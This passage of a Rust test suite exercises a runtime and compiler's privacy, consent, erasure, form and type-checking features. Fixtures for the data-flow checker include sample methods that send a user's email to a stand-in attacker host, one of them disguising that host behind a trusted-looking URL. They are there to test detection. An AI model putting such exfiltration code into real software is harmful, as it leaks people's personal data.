    assert!(out.iter().any(|o| matches!(o, Output::Emit { name, .. } if name == "checkedOut")));
}

#[test]
fn smart_meter_workflow_moves_through_states() {
    let (mut meter, _) = boot_as(&example("smart-meter"), Shared::default(), 0.0, true);
    // With a 1 kW limit every simulated sample is over the limit.
    call(&mut meter, 1.0, "Meter/home", "setLimit", json!([1, "test"])).unwrap();
    call(&mut meter, 2.0, "Meter/home", "record", json!([9, "gateway"])).unwrap();
    assert_eq!(state(&mut meter, 2.0, "Meter/home")["state"], json!("high"));

    // Timer samples keep it high; the confirmation alarm turns it into an alert.
    for t in [5_000.0, 10_000.0, 15_000.0, 16_000.0] {
        meter.handle(t, Input::Tick);
    }
    let s = state(&mut meter, 16_000.0, "Meter/home");
    assert_eq!((s["state"].clone(), s["acknowledged"].clone()), (json!("alert"), json!(false)));

    call(&mut meter, 17_000.0, "Meter/home", "acknowledge", json!(["ops"])).unwrap();
    let s = state(&mut meter, 17_000.0, "Meter/home");
    assert_eq!(s["acknowledged"], json!(true));
    assert!(s["notices"][0]["text"].as_str().unwrap().contains("ops acknowledged"));

    // Reading the meter is an event too.
    let out = meter.handle(18_000.0, Input::Get { object: "Meter/home".into(), reply: Some(1), caller: Some(Caller::trusted()) });
    assert!(out.iter().any(|o| matches!(o, Output::Emit { object, name, .. } if object == "Meter/home" && name == "read")));
}
/// What a host does with `tj:privacy` (tj-cli's engine): runs the erasure the effect asks
/// for and answers it.
fn erase_effects(rt: &mut Runtime, now: f64, out: Vec<Output>) -> Vec<Output> {
    let mut all = Vec::new();
    for o in out {
        match o {
            Output::Effect { id, effect: Effect::Plugin { plugin, method, args } } if plugin == "privacy" && method == "erase" => {
                let e = rt.erase_subject(args["id"].as_str().unwrap(), Some(id)).map_err(|e| e.1);
                let (ok, error) = match e {
                    Ok(e) => (Some(json!({ "erased": e.erased })), None),
                    Err(e) => (None, Some(e)),
                };
                let next = rt.handle(now, Input::EffectDone { id, ok, error, field: None, unreachable: false });
                all.extend(erase_effects(rt, now, next));
            }
            o => all.push(o),
        }
    }
    all
}

#[test]
fn a_person_erases_themselves_from_an_exclusive_method_and_no_record_of_the_call_is_kept() {
    let src = r#"
import { erase } from "tj:privacy"

@server @read("owner") object Account {
  @pii("contact", "account") email: string = ""
  @allow("owner") set(e: string) { this.email = e }
  @exclusive @allow("owner") async deleteMe(): any { return await erase(caller.id) }
}
"#;
    let store = Shared::default();
    let mut rt = Runtime::boot(compile(src).unwrap(), Box::new(store.clone()), Options { server: true, render: false, ..Options::new(0.0, 7) }).unwrap().0;
    call_as(&mut rt, 1.0, "Account/user:ana", "set", json!(["a@example.com"]), who("user:ana", &[])).unwrap();
    // A device's call, run once under its id: its result must not be kept on the object it erased.
    let out = rt.handle(2.0, Input::Call { object: "Account/user:ana".into(), method: "deleteMe".into(), args: vec![], reply: Some(1), call: Some("k1".into()), caller: who("user:ana", &[]) });
    let out = erase_effects(&mut rt, 2.0, out);
    let reply = out.iter().find_map(|o| if let Output::Reply { ok, error, .. } = o { Some((ok.clone(), error.clone())) } else { None }).expect("answered");
    assert_eq!(reply, (Some(json!({ "erased": ["Account/user:ana"] })), None), "its own lock does not block it");
    let saved = store.0.borrow().data["Account/user:ana"].clone();
    assert!(!saved.contains("erased") && !saved.contains("a@example.com"), "{saved}");
    let record: Json = serde_json::from_str(&saved).unwrap();
    assert!(record["calls"].as_array().is_none_or(|c| c.is_empty()), "{saved}");
}

#[test]
fn purposes_name_their_lawful_basis_when_declared() {
    let obj = "@server @read(\"owner\") object Account {\n  @pii(\"contact\", \"account\", \"marketing\") email: string = \"\"\n}\n";
    let with = |decl: &str| errors(&format!("{decl}\n{obj}"));
    // Optional, and checked when present.
    assert_eq!(errors(obj), "");
    assert_eq!(with(r#"const lawfulBasis = { account: "contract", marketing: "consent" }"#), "");
    assert_eq!(tj_core::facts(&format!("const lawfulBasis = {{ account: \"contract\", marketing: \"consent\" }}\n{obj}")).lawful_basis, Some(vec![("account".into(), "contract".into()), ("marketing".into(), "consent".into())]));
    let e = with(r#"const lawfulBasis = { account: "contract" }"#);
    assert!(e.contains("purposes without a lawful basis: \"marketing\"") && e.contains("marketing: \"contract\""), "{e}");
    let e = with(r#"const lawfulBasis = { account: "contract", marketing: "because" }"#);
    assert!(e.contains("\"because\" is not a lawful basis") && e.contains("legitimate-interest"), "{e}");
    let e = with(r#"const lawfulBasis = { account: "contract", marketing: "consent", billing: "contract" }"#);
    assert!(e.contains("no @pii field is held for \"billing\""), "{e}");
    assert!(with(r#"let lawfulBasis = { account: "contract", marketing: "consent" }"#).contains("must be declared with const"));
    assert!(with(r#"const lawfulBasis = ["account"]"#).contains("must be a record of purposes"));
    let twice = files(&[("app.tj", &format!("import {{ x }} from \"./more\"
const lawfulBasis = {{ account: \"contract\", marketing: \"consent\" }}
{obj}")), ("more.tj", "const lawfulBasis = { account: \"consent\" }
export const x = 1
")]);
    assert!(errors(&twice).contains("`lawfulBasis` is declared more than once"), "{}", errors(&twice));
}

#[test]
fn on_a_device_caller_id_is_the_signed_in_user_and_the_ui_follows_it() {
    let src = r#"@server @read("owner") object Member {
  name: string = ""
  @allow("owner") setName(n: string) { this.name = n }
}
function App() {
  if (caller.id === "") { return <Text id="who">signed out</Text> }
  return <Text id="who">{caller.id + (caller.roles.includes("staff") ? " (staff)" : "")}</Text>
}
"#;
    let (mut device, out) = boot_as(src, Shared::default(), 0.0, false);
    assert!(format!("{out:?}").contains("signed out"));
    let out = device.handle(1.0, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
    assert!(format!("{out:?}").contains("user:ana"), "drawn again for ana: {out:?}");
    let out = device.handle(2.0, Input::Identity { user: Some("user:ana".into()), roles: vec!["staff".into()] });
    assert!(format!("{out:?}").contains("user:ana (staff)"), "roles too, for showing staff controls: {out:?}");
    let out = device.handle(3.0, Input::Identity { user: None, roles: Vec::new() });
    assert!(format!("{out:?}").contains("signed out"), "and again when signed out");
}

#[test]
fn the_check_records_where_revealed_personal_data_is_sent() {
    use tj_core::Destination::{Host, Plugin, Unknown};
    let src = r#"import { complete } from "tj:ai"
@server @read("owner") object Member {
  @pii("contact", "account") email: string = ""
  @allow("owner") async welcome() { await send(reveal(this.email, "account")) }
  @allow("owner") async ask(): any { return await complete(reveal(this.email, "account"), [], []) }
  @allow("owner") async track(url: string) { await fetch(url, { body: reveal(this.email, "account") }) }
  @allow("owner") async leak() { await fetch(`https://evil.example/${reveal(this.email, "account")}`) }
  @allow("owner") async ping() { await fetch("https://status.example/up") }
}
async function send(to: string) { await fetch("https://API.Mailer.example:443/send", { method: "POST", body: to }) }
"#;
    assert_eq!(errors(src), "");
    let line = |at: u32| src[..at as usize].matches('\n').count() + 1;
    let found: Vec<(usize, tj_core::Destination, Vec<String>)> = tj_core::facts(src).transfers.into_iter().map(|t| (line(t.at), t.to, t.fields)).collect();
    let email = || vec!["Member.email".to_string()];
    assert_eq!(found, vec![(5, Plugin("tj:ai".into()), email()), (6, Unknown, email()), (7, Host("evil.example".into()), email()), (10, Host("api.mailer.example".into()), email())], "through helper functions too; a fetch without personal data is no transfer");
}

#[test]
fn revealed_data_is_followed_through_every_path_to_the_network() {
    use tj_core::Destination::{Cleartext, Host, Plugin, Unknown};
    let src = r#"import { act } from "tj:agent"
@server @read("staff") object Queue {
  @pii("contact", "account") @by("person") pending: { person: string, to: string }[] = []
  async flush() { for (const p of this.pending) { await fetch("https://queue.example/send", { body: reveal(p.to, "account") }) } }
}
let last = ""
@server @read("owner") object Member {
  @pii("contact", "account") email: string = ""
  @allow("owner") async reassigned() { let body = ""; body = reveal(this.email, "account"); await fetch("https://reassign.example/x", { body }) }
  @allow("owner") async spoofed() { await fetch("https://api.mailer.example:x@evil.example/steal", { body: reveal(this.email, "account") }) }
  @allow("owner") async plain() { await fetch("http://plain.example/x", { body: reveal(this.email, "account") }) }
  @allow("owner") async joined() { await fetch("https://joined.example/u/" + this.id, { body: reveal(this.email, "account") }) }
  @allow("owner") async ported() { await fetch(`https://ported.example:8443/${this.id}`, { body: reveal(this.email, "account") }) }
  @allow("owner") later() { this.schedule(60000, "remind", reveal(this.email, "account")) }
  async remind(to: string) { await fetch("https://alarm.example/x", { body: to }) }
  @allow("owner") queue() { Queue.get("main").pending.push({ person: this.id, to: reveal(this.email, "account") }) }
  @allow("owner") keep() { last = reveal(this.email, "account") }
  contact(): string { return reveal(this.email, "account") }
  @allow("owner") async help(q: string): any {
    return await act("Help.", [{ role: "user", text: q }], [{ name: "contact", object: `Member/${this.id}`, method: "contact", description: "The member's email.", params: [], input: { type: "object", properties: {} }, fixed: {} }], 2)
  }
}
async function report() { await fetch("https://global.example/x", { body: last }) }
"#;
    assert_eq!(errors(src), "");
    let line = |at: u32| src[..at as usize].matches('\n').count() + 1;
    let found: Vec<(usize, tj_core::Destination)> = tj_core::facts(src).transfers.into_iter().map(|t| (line(t.at), t.to)).collect();
    let has = |l: usize, d: tj_core::Destination| assert!(found.contains(&(l, d.clone())), "line {l} to {d:?} not found in {found:?}");
    has(4, Host("queue.example".into()));
    has(9, Host("reassign.example".into()));
    has(10, Unknown);
    has(11, Cleartext("plain.example".into()));
    has(12, Host("joined.example".into()));
    has(13, Host("ported.example".into()));
    has(15, Host("alarm.example".into()));
    has(20, Plugin("tj:ai".into()));
    has(23, Host("global.example".into()));
    assert!(!found.iter().any(|(_, d)| *d == Host("api.mailer.example".into())), "a user part does not make the allowed host the destination: {found:?}");
}

const CONSENTING: &str = r#"import { consented } from "tj:consent"
const lawfulBasis = { account: "contract", marketing: "consent" }
@server @read("owner") object Member {
  @pii("contact", "account", "marketing") email: string = ""
  sent: number = 0
  @allow("owner") setEmail(e: string) { this.email = e }
  @needs("consent:marketing") @allow("owner") news() { this.sent += 1 }
  @allow("owner") tryNews(): string {
    try { this.news(); return "sent" } catch (e) { return e.message }
  }
  @allow("owner") asks(): boolean { return consented(this.id, "marketing") }
}
"#;

#[test]
fn needs_consent_refuses_until_given_and_again_once_withdrawn() {
    let mut rt = server(CONSENTING, false);
    let ana = || who("user:ana", &[]);
    call_as(&mut rt, 1.0, "Member/user:ana", "setEmail", json!(["a@example.com"]), ana()).unwrap();
    let refused = call_as(&mut rt, 2.0, "Member/user:ana", "news", json!([]), ana()).unwrap_err();
    assert_eq!(refused.0, Some(403), "{refused:?}");
    assert!(refused.1.contains("has not consented to marketing"), "{refused:?}");
    assert!(call_as(&mut rt, 3.0, "Member/user:ana", "tryNews", json!([]), ana()).unwrap().as_str().unwrap().contains("has not consented"), "app code can catch it, so one refusal need not stop a loop");

    call_as(&mut rt, 4.0, "Consent/user:ana", "give", json!(["marketing", "Send me the club's news", "v1"]), ana()).unwrap();
    assert_eq!(call_as(&mut rt, 5.0, "Member/user:ana", "tryNews", json!([]), ana()), Ok(json!("sent")));
    assert_eq!(call_as(&mut rt, 5.0, "Member/user:ana", "asks", json!([]), ana()), Ok(json!(true)));
    assert!(call_as(&mut rt, 6.0, "Consent/user:bo", "give", json!(["marketing", "x", "v1"]), ana()).is_err(), "nobody gives consent for someone else");

    call_as(&mut rt, 7.0, "Consent/user:ana", "withdraw", json!(["marketing"]), ana()).unwrap();
    assert_eq!(call_as(&mut rt, 8.0, "Member/user:ana", "news", json!([]), ana()).unwrap_err().0, Some(403));
    // The record of it is the person's: exported with their data, erased with it.
    let data = rt.export_subject("user:ana").unwrap();
    assert_eq!(data["Consent/user:ana"]["given"]["marketing"]["text"], json!("Send me the club's news"));
    assert_eq!(data["Consent/user:ana"]["given"]["marketing"]["withdrawn"], json!(7));
    let e = rt.erase_subject("user:ana", None).unwrap();
    assert!(e.erased.contains(&"Consent/user:ana".to_string()), "{:?}", e.erased);
}

#[test]
fn a_consent_refusal_keeps_its_403_and_app_code_cannot_forge_one() {
    let src = CONSENTING.replace("  @allow(\"owner\") asks()", "  @allow(\"owner\") forge() { throw { message: \"x\", status: 401 } }
  @allow(\"owner\") asks()");
    let mut rt = server(&src, false);
    let ana = || who("user:ana", &[]);
    // A device's call, run once under its id: still 403, and nothing kept for it.
    let out = rt.handle(1.0, Input::Call { object: "Member/user:ana".into(), method: "news".into(), args: vec![], reply: Some(1), call: Some("k1".into()), caller: ana() });
    let status = out.iter().find_map(|o| if let Output::Reply { status, error: Some(_), .. } = o { Some(*status) } else { None });
    assert_eq!(status, Some(Some(403)), "{out:?}");
    assert_eq!(rt.export_subject("user:ana").unwrap()["Member/user:ana"]["sent"], json!(0));
    // A record thrown by app code is an ordinary error, whatever it says.
    assert_eq!(call_as(&mut rt, 2.0, "Member/user:ana", "forge", json!([]), ana()).unwrap_err().0, None);
}

#[test]
fn needs_consent_is_checked_where_it_must_be() {
    let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| format!("{} | {}", d.message, d.hint.clone().unwrap_or_default())).collect::<Vec<_>>().join("\n")).unwrap_or_default();
    let import = "import { consented } from \"tj:consent\"\n";
    assert!(msg(&format!("{import}object Board {{\n  @needs(\"consent:marketing\") f() {{}}\n}}\n")).contains("@needs is for methods of a @server object that belongs to a person"));
    assert!(msg("@server @read(\"owner\") object M {\n  @needs(\"consent:marketing\") f() {}\n}\n").contains("add import { consented } from \"tj:consent\""));
    assert!(msg(&format!("{import}@server @read(\"owner\") object M {{\n  @needs(\"marketing\") f() {{}}\n}}\n")).contains("@needs takes \"consent:<purpose>\""));
    // Data for a purpose resting on consent is revealed only where consent is checked.
    let app = |method: &str| format!("{import}const lawfulBasis = {{ marketing: \"consent\" }}\n@server @read(\"owner\") object M {{\n  @pii(\"contact\", \"marketing\") email: string = \"\"\n  {method}\n}}\n");
    let e = msg(&app("async send() { await fetch(\"https://mail.example/x\", { body: reveal(this.email, \"marketing\") }) }"));
    assert!(e.contains("\"marketing\" rests on consent") && e.contains("add @needs(\"consent:marketing\")"), "{e}");
    assert_eq!(msg(&app("@needs(\"consent:marketing\") async send() { await fetch(\"https://mail.example/x\", { body: reveal(this.email, \"marketing\") }) }")), "");
    // Collecting data held only on consent needs the consent; clearing it does not.
    let e = msg(&app("@allow(\"owner\") setEmail(e: string) { this.email = e }"));
    assert!(e.contains("M.email is held only for marketing, which rests on consent") && e.contains("add @needs(\"consent:marketing\")"), "{e}");
    assert_eq!(msg(&app("@needs(\"consent:marketing\") @allow(\"owner\") setEmail(e: string) { this.email = e }")), "");
    assert_eq!(msg(&app("@allow(\"owner\") forget() { this.email = \"\" }")), "");
    // @needs may be written once per purpose too.
    assert_eq!(msg(&format!("{import}@server @read(\"owner\") object M {{
  @needs(\"consent:a\") @needs(\"consent:b\") f() {{}}
}}
")), "");
    // Only tj:consent keeps consents: an app's own Consent object does not count.
    let own = "@server object Consent {
  given: any = {}
}
@server @read(\"owner\") object M {
  @needs(\"consent:marketing\") f() {}
}
";
    assert!(msg(own).contains("add import { consented } from \"tj:consent\""), "{}", msg(own));
}

#[test]
fn the_privacy_check_follows_callbacks_over_the_same_list_without_crashing() {
    // Found by the Milestone 1 builder: these crashed the compiler (a container merged into
    // itself while the check followed an arrow callback).
    let src = r#"@server @read("owner") object Profile { @pii("contact", "booking") name: string = "" }
function f(parts: string[], s: string) { const q = [s]; const ok = parts.every(p => p === "") }
@server object Roster {
  entries: string[] = []
  has(id: string): boolean { return this.entries.some(e => e === id) }
  drop(id: string) { this.entries = this.entries.filter(e => e !== id) }
}
@server @read("owner") object Customer {
  @allow("owner") leave() { const r = Roster.get("main"); if (r.has(this.id)) { r.drop(this.id) } }
}
"#;
    assert_eq!(errors(src), "");
}

#[test]
fn number_of_text_that_is_not_a_number_is_nan() {
    let mut rt = boot("object T {\n  n: string = \"\"\n  f() { const x = Number(\"abc\"); const y = Number(\"42\"); this.n = (x !== x ? \"nan\" : \"num\") + \",\" + String(y) }\n}\n");
    call(&mut rt, 1.0, "T/t", "f", json!([])).unwrap();
    assert_eq!(state(&mut rt, 2.0, "T/t")["n"], json!("nan,42"));
}

#[test]
fn a_press_is_answered_once_its_handler_starts_waiting() {
    // Found in Milestone 1: an agent's tap whose handler awaited a server call hung until the
    // server came back.
    let src = "@server object Board {\n  notes: string[] = []\n  add(text: string) { this.notes.push(text) }\n}\nfunction App() {\n  return <Button id=\"add\" onPress={async () => { await Board.get(\"b\").add(\"x\") }}>Add</Button>\n}\n";
    let (mut device, _) = boot_as(src, Shared::default(), 0.0, false);
    let out = device.handle(1.0, Input::Ui { target: Target::Id { id: "add".into() }, event: "onPress".into(), value: Json::Null, reply: Some(9) });
    assert!(out.iter().any(|o| matches!(o, Output::Reply { reply: 9, error: None, .. })), "answered now: {out:?}");
    assert_eq!(server_calls(&out).len(), 1, "and the call went out");
}

#[test]
fn signing_out_clears_what_the_device_kept_for_that_person() {
    let src = "object Screen {\n  draft: string = \"\"\n  type(t: string) { this.draft = t }\n}\nfunction App() {\n  return <Text id=\"d\">{Screen.get(\"main\").draft}</Text>\n}\n";
    let store = Shared::default();
    let (mut device, _) = boot_as(src, store.clone(), 0.0, false);
    device.handle(0.0, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
    call(&mut device, 1.0, "Screen/main", "type", json!(["ana's phone 555"])).unwrap();
    device.handle(2.0, Input::Identity { user: None, roles: Vec::new() });
    assert!(store.0.borrow().data.keys().all(|k| !k.starts_with("Screen/")), "the record is deleted, key and all: {:?}", store.0.borrow().data.keys().collect::<Vec<_>>());
    assert_eq!(state(&mut device, 3.0, "Screen/main")["draft"], json!(""), "gone from memory");
    let (mut later, _) = boot_as(src, store.clone(), 4.0, false);
    assert_eq!(state(&mut later, 5.0, "Screen/main")["draft"], json!(""), "and from the device's storage");

    // An app nobody signs in to keeps its state.
    let kept = Shared::default();
    let (mut device, _) = boot_as(src, kept.clone(), 0.0, false);
    call(&mut device, 1.0, "Screen/main", "type", json!(["my list"])).unwrap();
    device.handle(2.0, Input::Identity { user: None, roles: Vec::new() });
    assert_eq!(state(&mut device, 3.0, "Screen/main")["draft"], json!("my list"));
}

#[test]
fn time_does_calendar_arithmetic_on_plain_milliseconds() {
    let src = r#"object T {
  out: any = null
  run() {
    const t = Time.from({ year: 2026, month: 1, day: 31, hour: 14, minute: 30 })
    const p = Time.parts(t === null ? 0 : t)
    const nextMonth = Time.add(t === null ? 0 : t, { months: 1 })
    this.out = {
      parts: p,
      nextMonth: Time.parts(nextMonth),
      later: Time.parts(Time.add(t === null ? 0 : t, { days: 2, minutes: 45 })),
      day: Time.parts(Time.startOf(t === null ? 0 : t, "day")),
      week: Time.parts(Time.startOf(t === null ? 0 : t, "week")),
      bad: Time.from({ year: 2026, month: 2, day: 30 }),
      partial: Time.from({ year: 2026, month: 2, day: null }),
      plain: (t === null ? 0 : t) + 60000 - (t === null ? 0 : t),
    }
  }
}
"#;
    let mut rt = boot(src);
    call(&mut rt, 1.0, "T/t", "run", json!([])).unwrap();
    let out = state(&mut rt, 2.0, "T/t")["out"].clone();
    assert_eq!(out["parts"], json!({ "year": 2026, "month": 1, "day": 31, "hour": 14, "minute": 30, "second": 0, "weekday": 6 }));
    assert_eq!((&out["nextMonth"]["month"], &out["nextMonth"]["day"]), (&json!(2), &json!(28)), "January 31 plus a month is February's last day");
    assert_eq!((&out["later"]["day"], &out["later"]["hour"], &out["later"]["minute"]), (&json!(2), &json!(15), &json!(15)), "February 2, 15:15");
    assert_eq!((&out["day"]["hour"], &out["day"]["minute"]), (&json!(0), &json!(0)));
    assert_eq!((&out["week"]["day"], &out["week"]["weekday"]), (&json!(26), &json!(1)), "the Monday before");
    assert_eq!(out["bad"], json!(null), "February 30 is not a date");
    assert_eq!(out["partial"], json!(null), "a missing day is not a date either");
    assert_eq!(out["plain"], json!(60000), "times are plain numbers");
}

#[test]
fn calls_from_outside_must_fit_the_declared_parameter_types() {
    let src = r#"type Slot = { title: string, minutes: number, note?: string }
@server @read("anyone") object Board {
  last: string = ""
  @allow("anyone") publish(title: string, minutes: number, kind: "cut" | "shave", tags?: string[]) { this.last = title }
  @allow("anyone") put(slot: Slot) { this.last = slot.title }
  @allow("anyone") loose(x: any) { this.last = "any" }
  @allow("anyone") confirm(really: true) { this.last = "confirmed" }
}
"#;
    let mut rt = server(src, false);
    let anyone = || who("", &[]);
    let call = |rt: &mut Runtime, m: &str, args: Json| call_as(rt, 1.0, "Board/b", m, args, anyone());
    assert!(call(&mut rt, "publish", json!(["Cut", 30, "cut"])).is_ok());
    assert!(call(&mut rt, "publish", json!(["Cut", 30, "shave", ["a"]])).is_ok(), "optional given");
    assert!(call(&mut rt, "publish", json!(["Cut", 30, "cut", null])).is_ok(), "optional as null");
    let e = call(&mut rt, "publish", json!(["Cut", "30", "cut"])).unwrap_err();
    assert_eq!(e.0, Some(400));
    assert!(e.1.contains("Board.publish: `minutes` must be a number, got text: \"30\""), "{}", e.1);
    assert!(call(&mut rt, "publish", json!(["Cut", 30, "trim"])).unwrap_err().1.contains("`kind` must be \"cut\" or \"shave\""));
    assert!(call(&mut rt, "publish", json!(["Cut", 30])).unwrap_err().1.contains("`kind` is missing"));
    assert!(call(&mut rt, "publish", json!(["Cut", 30, "cut", [], "extra"])).unwrap_err().1.contains("takes 4 argument(s) (title, minutes, kind, tags), got 5"));
    // Type aliases are followed; unknown fields are refused, optional ones may be left out.
    assert!(call(&mut rt, "put", json!([{ "title": "Cut", "minutes": 30 }])).is_ok());
    assert!(call(&mut rt, "put", json!([{ "title": "Cut", "minutes": 30, "admin": true }])).unwrap_err().1.contains("`slot` must be a record with title, minutes, note?"));
    assert!(call(&mut rt, "loose", json!([{ "anything": [1, "x"] }])).is_ok(), "any takes anything");
    // A large wrong value is not echoed back whole.
    let big = "x".repeat(10_000);
    let e = call(&mut rt, "publish", json!([big, 30, "cut"])).is_ok();
    assert!(e, "a long title is still a string");
    let e = call(&mut rt, "publish", json!(["Cut", [big], "cut"])).unwrap_err().1;
    assert!(e.len() < 200 && e.ends_with("..."), "{}", e.len());
    assert!(call(&mut rt, "confirm", json!([false])).unwrap_err().1.contains("`really` must be true"));
    assert!(call(&mut rt, "confirm", json!([true])).is_ok());
}

#[test]
fn check_states_a_rule_once_for_the_ui_and_the_server() {
    let src = r#"function validSlot(title: string, minutes: number) {
  check(title.trim() !== "", "title", "Give the slot a title")
  check(minutes >= 5 && minutes <= 480, "minutes", "A slot lasts 5 to 480 minutes")
}
@server @read("anyone") object Board {
  last: string = ""
  @allow("anyone") publish(title: string, minutes: number) {
    validSlot(title, minutes)
    this.last = title
  }
}
object Form {
  error: string = ""
  field: string = ""
  try(title: string, minutes: number) {
    try { validSlot(title, minutes); this.error = "" } catch (e) { this.error = e.message; this.field = e.field }
  }
}
"#;
    let mut rt = server(src, false);
    let e = call_as(&mut rt, 1.0, "Board/b", "publish", json!(["Cut", 3]), who("", &[])).unwrap_err();
    assert!(e.1.contains("A slot lasts 5 to 480 minutes"), "{e:?}");
    assert!(call_as(&mut rt, 1.0, "Board/b", "publish", json!(["Cut", 30]), who("", &[])).is_ok());
    let mut ui = boot(src);
    call(&mut ui, 1.0, "Form/f", "try", json!(["", 30])).unwrap();
    assert_eq!((state(&mut ui, 2.0, "Form/f")["error"].clone(), state(&mut ui, 2.0, "Form/f")["field"].clone()), (json!("Give the slot a title"), json!("title")));
}

const PROFILE: &str = r#"import { Form, FormInput, Notice } from "tj:ui"
@server @read("owner") object Customer {
  @pii("contact", "booking") name: string = ""
  @allow("owner") save(name: string) { this.name = name }
}
function validName(name: string) { check(name.trim() !== "", "name", "Give your name") }
function App() {
  const me = Customer.get(caller.id)
  const f = Form.get("profile")
  return <Column>
    <FormInput form={f} name="name" label="Name" saved={me.name} />
    <Button id="save" disabled={f.busy()} onPress={() => f.submit(() => {
      validName(f.value("name", me.name))
      return me.save(f.value("name", me.name))
    })}>Save</Button>
    <Notice id="form-error" text={f.error} />
  </Column>
}
"#;

#[test]
fn a_form_keeps_drafts_shows_errors_at_their_field_and_sends_once() {
    let store = Shared::default();
    let (mut device, _) = boot_as(PROFILE, store.clone(), 0.0, false);
    device.handle(0.5, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
    let out = device.handle(1.0, Input::Sync { object: "Customer/user:ana".into(), state: json!({ "name": "Ana" }), seq: Some(1) });
    assert!(format!("{out:?}").contains("Ana"), "the saved value shows: {out:?}");
    let ui = |id: &str, event: &str, value: Json| Input::Ui { target: Target::Id { id: id.into() }, event: event.into(), value, reply: None };
    let call = |out: &[Output]| out.iter().find_map(|o| match o {
        Output::Effect { id, effect: Effect::Call { method, args, .. } } => Some((*id, method.clone(), args.clone())),
        _ => None,
    });
    // A rule broken on the device shows at its field, and nothing is sent.
    device.handle(2.0, ui("name", "onChange", json!(" ")));
    let out = device.handle(2.1, ui("save", "onPress", Json::Null));
    assert!(call(&out).is_none() && format!("{out:?}").contains("Give your name") && format!("{out:?}").contains("name-error"), "{out:?}");
    // Typing clears it; saving sends once, however often it is pressed while waiting.
    let form = |device: &Runtime| device.inspect()["objects"].as_array().unwrap().iter().find(|o| o["object"] == "Form/profile").unwrap()["state"].clone();
    device.handle(3.0, ui("name", "onChange", json!("Bo")));
    assert_eq!(form(&device)["errors"]["name"], json!(""));
    let out = device.handle(3.1, ui("save", "onPress", Json::Null));
    let (effect, method, args) = call(&out).expect("sent");
    assert_eq!((method.as_str(), args), ("save", vec![json!("Bo")]));
    assert!(call(&device.handle(3.2, ui("save", "onPress", Json::Null))).is_none(), "one at a time");
    // The answer comes: the draft goes, and the input shows what is saved.
    device.handle(4.0, Input::EffectDone { id: effect, ok: Some(Json::Null), error: None, field: None, unreachable: false });
    let out = device.handle(4.1, Input::Sync { object: "Customer/user:ana".into(), state: json!({ "name": "Bo" }), seq: Some(2) });
    assert!(format!("{out:?}").contains("Bo"), "{out:?}");
    assert_eq!(form(&device)["drafts"], json!({}));
    // An error from the server shows for the whole form, and one with a field shows at that field.
    device.handle(5.0, ui("name", "onChange", json!("Cy")));
    let (effect, ..) = call(&device.handle(5.1, ui("save", "onPress", Json::Null))).expect("sent");
    let out = device.handle(6.0, Input::EffectDone { id: effect, ok: None, error: Some("The business is closed".into()), field: None, unreachable: false });
    assert!(format!("{out:?}").contains("The business is closed") && format!("{out:?}").contains("form-error"), "{out:?}");
    let (effect, ..) = call(&device.handle(6.1, ui("save", "onPress", Json::Null))).expect("sent");
    let out = device.handle(6.2, Input::EffectDone { id: effect, ok: None, error: Some("Name already taken".into()), field: Some("name".into()), unreachable: false });
    assert!(format!("{out:?}").contains("Name already taken") && format!("{out:?}").contains("name-error"), "{out:?}");
    // Sent, then the app restarts before the answer: the draft is kept, and the form is not
    // left waiting for an answer it can no longer hear. (The call itself stays in the outbox,
    // and the new one goes after it.)
    call(&device.handle(7.0, ui("save", "onPress", Json::Null))).expect("sent");
    let (mut device, _) = boot_as(PROFILE, store, 8.0, false);
    let out = device.handle(8.1, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
    assert!(format!("{out:?}").contains("Cy") && !format!("{out:?}").contains("\"disabled\": Bool(true)"), "the draft, and a form ready to send: {out:?}");
    let out = device.handle(8.2, ui("save", "onPress", Json::Null));
    assert!(format!("{out:?}").contains("\"disabled\": Bool(true)"), "sending again: {out:?}");
}

#[test]
fn server_check_preserves_field_across_rpc_and_idempotent_retries() {
    let src = r#"@server @read("owner") object Customer {
  name: string = ""
  @allow("owner") save(name: string) {
    check(name.trim() !== "", "name", "Give your name")
    this.name = name.trim()
  }
}
"#;
    let mut srv = server(src, true);
    let call = |reply: u64| Input::Call { object: "Customer/user:ana".into(), method: "save".into(), args: vec![json!("   ")], reply: Some(reply), call: Some("k-1".into()), caller: who("user:ana", &[]) };
    let out = srv.handle(1.0, call(1));
    assert!(out.iter().any(|o| matches!(o, Output::Reply { error: Some(e), field: Some(f), .. } if e == "Give your name" && f == "name")), "{out:?}");
    // A retry with the same call id gets the same error and field from the call record.
    let retry = srv.handle(2.0, call(2));
    assert!(retry.iter().any(|o| matches!(o, Output::Reply { error: Some(e), field: Some(f), .. } if e == "Give your name" && f == "name")), "{retry:?}");
}

#[test]
fn actions_queue_multiple_items_offline_without_dropping_the_second() {
    let src = r#"import { Actions, Notice } from "tj:ui"
@server @read("anyone") object Slot {
  @allow("signedIn") book() {}
  @allow("signedIn") cancel() {}
}
function App() {
  const a = Actions.get("slots")
  return <Column>
    <Button id="book-s2" disabled={a.busy("s2")} onPress={() => a.run("s2", () => Slot.get("s2").book())}>Book</Button>
    <Button id="cancel-s1" disabled={a.busy("s1")} onPress={() => a.run("s1", () => Slot.get("s1").cancel())}>Cancel</Button>
    <Notice id="book-error" text={a.error} kind="error" />
  </Column>
}
"#;
    let ui = |id: &str| Input::Ui { target: Target::Id { id: id.into() }, event: "onPress".into(), value: Json::Null, reply: None };
    let calls = |out: &[Output]| -> Vec<(u32, String, String)> {
        out.iter().filter_map(|o| if let Output::Effect { id, effect: Effect::Call { object, method, .. } } = o { Some((*id, object.clone(), method.clone())) } else { None }).collect()
    };
    let (mut device, _) = boot_as(src, Shared::default(), 0.0, false);
    device.handle(0.5, Input::Identity { user: Some("user:bo".into()), roles: Vec::new() });
    // First action queues and stays waiting (offline).
    let c1 = calls(&device.handle(1.0, ui("book-s2")));
    assert_eq!(c1.len(), 1);
    assert_eq!((c1[0].1.as_str(), c1[0].2.as_str()), ("Slot/s2", "book"));
    // Repeat press on the same key is ignored while in flight.
    assert!(calls(&device.handle(1.1, ui("book-s2"))).is_empty());
    // A second action on another item still queues instead of being dropped!
    let c2 = calls(&device.handle(1.2, ui("cancel-s1")));
    assert_eq!(c2.len(), 1);
    assert_eq!((c2[0].1.as_str(), c2[0].2.as_str()), ("Slot/s1", "cancel"));
    // Both answers come back on reconnect: s2 conflicts (error shown), s1 succeeds.
